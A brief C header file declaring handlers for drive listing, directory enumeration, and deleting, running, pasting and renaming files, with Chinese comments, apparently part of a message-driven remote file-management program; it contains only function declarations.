#if !defined(AFX_FILEOPERATOR_H)
#define AFX_FILEOPERATOR_H

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000

#include "Command.h"
///////////////////////////////////////////////////////////
//
//发送硬盘信息
void FileListDirver(char *pBuf, LPMsgHead lpMsgHead);
//枚举文件路径
void FileListDirectory(char *pBuf, LPMsgHead lpMsgHead);
//文件删除
void FileDelete(char *pBuf, LPMsgHead lpMsgHead);
//运行文件
void FileExec(char *pBuf, LPMsgHead lpMsgHead);
//粘贴文件
void FilePaste(char *pBuf, LPMsgHead lpMsgHead);
//从命名文件
void FileReName(char *pBuf, LPMsgHead lpMsgHead);

#endif // !defined(AFX_FILEOPERATOR_H)
